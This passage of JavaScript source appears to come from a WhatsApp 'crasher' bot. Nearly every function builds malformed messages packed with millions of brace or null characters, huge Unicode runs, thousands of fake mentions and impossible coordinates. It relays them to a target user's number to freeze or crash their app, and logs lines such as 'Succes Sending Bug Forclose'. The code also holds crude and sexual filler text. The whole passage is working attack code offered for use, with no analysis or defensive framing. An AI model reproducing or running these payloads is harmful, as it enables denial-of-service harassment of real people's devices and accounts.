              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: VaxzyXx + "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: VaxzyXx + "{".repeat(20000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
    
  await Ataa.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  await Ataa.sendMessage(target, { delete: msg.key });
  console.log(chalk.green(`Succes Sending Bug Forclose To ${target}`));
  }
  
async function InvisibleFc(IqbalXpn, target) {
    const corruptedJson = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: corruptedJson,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: corruptedJson,
                address: corruptedJson
              }
            },
            body: { text: corruptedJson },
            footer: { text: corruptedJson },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: corruptedJson,
        footerText: corruptedJson,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: corruptedJson },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: corruptedJson,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: corruptedJson,
        title: corruptedJson,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: corruptedJson,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(corruptedJson).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
        mediaKey: Buffer.from(corruptedJson).toString("base64"),
        directPath: corruptedJson,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await Ataa.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red("DEMON CRASH BERHASIL DIKIRIM"));
}

async function XProtexBlankChatV5(CsmX, target) {
  const MSG = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "Xx".repeat(10000),
      inviteExpiration: "99999999999",
      groupName: "⌁⃰𝐓𝐇𝐄 𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃🥵👈ཀ‌‌" + "ោ៝".repeat(10000),
      caption: "ោ៝".repeat(10000),
      contextInfo: {
      expiration: 1,
        ephemeralSettingTimestamp: 1,
        entryPointConversionSource: "WhatsApp.com",
        entryPointConversionApp: "WhatsApp",
        entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: "0@s.whatsapp.net",
          questionMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        },
        externalAdReply: {
          showAdAttribution: false,
          renderLargerThumbnail: true
        }
      },
      body: {
        text: "⎋ 🦠</🧬⃟༑⌁⃰𝐓𝐇𝐄 𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃🥵👈" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
      },
      nativeFlowMessage: {
        messageParamJson: "{".repeat(25000),
      },
        buttons: [
          {
            name: "cta_url",
            buttonParamJson: "\u0000".repeat(25000),
          },
        ],
      },
    };
  
  await Ataa.relayMessage(target, MSG, {
    participant: { jid: target },
    messageId: null,
  });
  console.log(chalk.red(`Succes Sending Bug Blank By Obito To ${target}`));
  }
  
async function KontolInvis(Ranstech, target) {
    const corruptedJson = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: corruptedJson,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: corruptedJson,
                address: corruptedJson
              }
            },
            body: { text: corruptedJson },
            footer: { text: corruptedJson },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: corruptedJson,
        footerText: corruptedJson,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: corruptedJson },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: corruptedJson,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: corruptedJson,
        title: corruptedJson,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: corruptedJson,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(corruptedJson).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
        mediaKey: Buffer.from(corruptedJson).toString("base64"),
        directPath: corruptedJson,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await Ataa.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red("BUG BERHASIL DIKIRIM"));
}

const QclrsXjustin = {
			key: {
				remoteJid: '🩸Justin',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Justin Crash",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "wraperosXjustin",
						"paramsJson": `{\"splashscreen_2_OptIn_0\":true,\"splashscreen_2_OptIn_1\":true,\"splashscreen_1_Dropdown_0\":\"𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥\",\"splashscreen_1_DatePicker_1\":\"1028995200000\",\"splashscreen_1_TextInput_2\":\"JustinAndiar\",\"screen_1_TextInput_3\":\"94643116\",\"splashscreen_0_TextInput_0\":\"𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥${"\u0003".repeat(1045000)}\",\"splashscreen_0_TextInput_1\":\"INFINITE\",\"splashscreen_0_Dropdown_2\":\"001-Grimgar\",\"splashscreen_0_wraperosXjustin_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 17
					}
				}
			}
		}


        
async function XStromForce(target) {
  let buttonsFreze = [];

    buttonsFreze.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
    
    for (let i = 0; i < 2000; i++) {
      buttonsFreze.push({
        name: "call_permission_request",
        buttonParamsJson: JSON.stringify({
          status: true,
        }),
      });
    }
    
    buttonsFreze.push({
      name: "call_permission_request",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
    
  
    const biji = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           body: {
             text: "⌁⃰𝙊𝙑𝙀𝙍𝙇𝙊𝘼𝘿-𝙓ཀ",
            },
            footer: {
              text: "⌁⃰𝙊𝙑𝙀𝙍𝙇𝙊𝘼𝘿-𝙓ཀ",
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: Array(50).fill("0@s.whatsapp.net"),
              quotedMessage: {
              externalAdReply: {
                title: "ꦾ".repeat(77777),
                body: "\x10".repeat(50000),
                previewType: "PHOTO",
                thumbnail: null,
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://t.me/@Alpooooooofoluv"
                },
              },
              forwardingScore: 999,
              isForwarded: true
            },
            nativeFlowMessage: {
              buttons: buttonsFreze,
              messageParamJson: JSON.stringify({
                title: "ꦾ".repeat(77777),
                description: "\x10".repeat(25000),
                metadata: {
                junk: "\u0000".repeat(25000)
              }
            })
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(biji), { userJid: target });
  await Ataa.relayMessage(target, msg.message, { messageId: msg.key.id });
   console.log(chalk.red(`Succes Sending Bug Force By XStrom-Flower To ${target}`));
}

async function csnith(sock, isTarget) {
      try {
  const payload = {
    ephemeralMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name:
              "🍻⃟༑⌁⃰𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃 𝐈𝐒 𝐇𝐄𝐑𝐄 𝐁𝐀𝐁𝐘ཀ͜͡🍻" +
              "ꦽ".repeat(45000),
            address: "🍻⃟༑⌁⃰𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃 𝐈𝐒 𝐇𝐄𝐑𝐄 𝐁𝐀𝐁𝐘ཀ͜͡🍻",
            url:
              "https://fvck.snith.🩸" +
              "؂ن؃".repeat(100000) +
              ".com",
            contextInfo: {
              externalAdReply: {
                quotedAd: {
                  advertiserName: " ؂ن؃".repeat(10000),
                  mediaType: "IMAGE",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                  caption: " X ",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid:
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net",
                  creatorName: "Bot",
                },
              },
            },
          },
        },
      },
  };

  const message = await (async () => {
    try {
      return generateWAMessageFromContent(
        isTarget,
        payload,
        {}
      );
    } catch (e) {
      console.error("Error generating message payload:", e);
    }
  })();

  if (message) {
    await sock.relayMessage(
      isTarget,
      message.message,
      { messageId: message.key.id }
    );
  }
} catch (e) {
    console.error("❌ Error kirim message:", e);
  }
}

async function desnith(sock, obejctive, mention = true) {
try {
    let sxo = generateWAMessageFromContent(obejctive, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "🍻⃟༑⌁𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃 𝐈𝐒 𝐇𝐄𝐑𝐄 𝐁𝐀𝐁𝐘⃰ཀ͜͡🍻",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: obejctive,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(obejctive, sXoMessage, {});
      await sock.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [obejctive],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: obejctive }, content: undefined }
                ]
            }]
        }]
    });
     if (mention) {
        await Ataa.relayMessage(obejctive, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await sock.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [obejctive],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: obejctive }, content: undefined }
                ]
            }]
        }]
    });
    if (mention) {
        await Ataa.relayMessage(obejctive, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}

async function qNested(sock, target) {
  const media = await prepareWAMessageMedia(
    {
      image: fs.readFileSync('./img.jpg'),
    },
    { upload: sock.waUploadToServer }
  )

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: media.imageMessage,
            hasMediaAttachment: true,
          },
          body: {
            text: "🍻⃟༑ " + "ꦽ".repeat(50000),
          },
          footerText: "© 𝐎𝐕𝐄𝐑𝐋𝐎𝐀𝐃 to #S#X#?",
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000".repeat(10000),
                  flow_message_version: "3",
                }),
              },
              {
                name: "payment_method",
                buttonParamsJson: JSON.stringify({
                  reference_id: null,
                  payment_method: "DEMO",
                  payment_timestamp: null,
                  share_payment_status: true,
                }),
              },
            ],
            messageParamsJson: "{}",
          },
          contextInfo: {
            remoteJid: target,
            participant: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/stxpos",
                  unconsentedUsersUrl: "https://t.me/stxpos",
                  consentedUsersUrl: "https://t.me/stxpos",
                  cardIndex: 1,
                },
                {
                  originalUrl: "https://t.me/stxpos",
                  unconsentedUsersUrl: "https://t.me/stxpos",
                  consentedUsersUrl: "https://t.me/stxpos",
                  cardIndex: 2,
                },
              ],
            },
          },
          quotedMessage: {
            interactiveMessage: {
              body: { text: "⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧" + "ꦽ".repeat(20000) },
              footerText: "🍻⃟༑",
            },
          },
        },
      },
    },
  }

  await Ataa.relayMessage(target, msg, {})
}

async function TraVisZap(isTarget, mention = true/false) {
    console.log(chalk.red("#sockzX"));

    let payload = "";
    for (let i = 0; i < 900; i++) {
        payload = "\u0000".repeat(2097152);
    }

    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
      fileLength: "211396",
      height: 816,
      width: 654,
      mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
      fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
      directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1749220174",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
                    contextInfo: {
                        mentionedJid: mentionedJid,
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 2097152,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    const msg = await generateWAMessageFromContent(isTarget, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ataa.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                    protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "XxTravas" }, // Jangan Dihapus
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function oricallforce(target) {
  const texts = [
    "ᬼ".repeat(60000),
    "ោ៝".repeat(60000), 
    ".ؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕؕ".repeat(20000),
    "𑜦𑜠".repeat(60000), 
    "ًٌٍٍَُِِّّّْ".repeat(20000), 
    "ꦾ".repeat(60000), 
    "ۢ۬ۤۢ".repeat(20000),
    "᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳".repeat(20000),
  ];

  for (const text of texts) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: " ~ 🦠𞋯𝑱ᮖ࿚ᮘ𝐥࿆𝜣ᮏ  ᮓ𝜩꣡𝑹𝑨𝑳𝑫𝒁🍷𞋯 ~",
                hasMediaAttachment: false,
              },
              body: {
                text: "\n" + text,
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: { status: true }
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ 
                      status: true })
                  },
                ],
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net" 
                },
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                },
                externalAdReply: {
                  title: "🕷️ ~ raldzz`executive ~ 🕷️",
                  body: "ោ៝".repeat(10000),
                  mediaType: 1,
                  thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                  mediaUrl: "about:blank",
                  sourceUrl: "about:blank",
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: 99999999999 * 9999999e+21
                  }
                },
                groupInviteMessage: {
                  inviteCode: "X".repeat(9999),
                  groupJid: "13135550002@g.us",
                  groupName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
                  inviteExpiration: 99999999999e+21,
                  caption: "how to get past this feeling ¿?"
                }
              },
            },
          },
        },
      },
      {}
    );

    await Ataa.relayMessage(target, msg.message, {
      messageId: msg.key.id,
    });
  }
}

async function LocationUi(target) {
  try {
    await Ataa.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "Nted Crasher?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function FreezeXDelay1(target) {
  try {
    await Ataa.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "Nted Crasher?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Nted - Crasher",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function FreezeXDelay2(target) {
  try {
    await Ataa.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                 "Nted Crasher?" + "ꦽ".repeat(92000) + "ꦾ".repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 50000) + "@s.whatsapp.net")
                    ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function LocationInvisible(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Nted Suka Besi" + "ꦾ".repeat(45000),
                address: "MedanWok 😹"
              },
            },
            body: {
              text: "Nted Pen Nenen Jir" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: jid,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await Ataa.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function DelayInvisible(nted, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "Nted Suka Besi 😹" + "ꦾ".repeat(45000),
                address: "MedanWok 😹",
              },
            },
            body: {
              text: "Nted Pen Nenen Jir" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "Nted-Doc.txt",
                  mimetype: "text/plain",
                  fileLength: 999999999,
                  caption: "Nted Crasher Neverdie?",
                  pageCount: 9999,
                  mediaKey: "\u0000".repeat(50),
                  jpegThumbnail: Buffer.from(""),
                },
              },
            },
          },
        },
      },
    };

    await Ataa.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function Flood(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 9999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `⍣᳟`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(5000),
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                },
              ],
            },
          },
        },
      },
    };
    await Ataa.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

//shios
async function fluids(target) {
await Ataa.relayMessage(target, 
  {
     viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "..." + "?".repeat(10),
            description: "#!".repeat(60000),
            listType: 1,
          },
        },
      },
    },
    { 
    ephemeralExpiration: 5, 
    timeStamp: Date.now(),
     },
  );
}

//Doc b
async function DocBlank(target, ptcp = true) {
  await Ataa.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Xnxx.com",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "\u0000\n" + "ꦾ".repeat(60000),
            },
            nativeFlowMessage: {
                  messageParamsJson: "{".repeat(5000),
                },
            footer: {
              text: "\u0000\n" + "ꦾ".repeat(60000),
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Xnxx.com",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
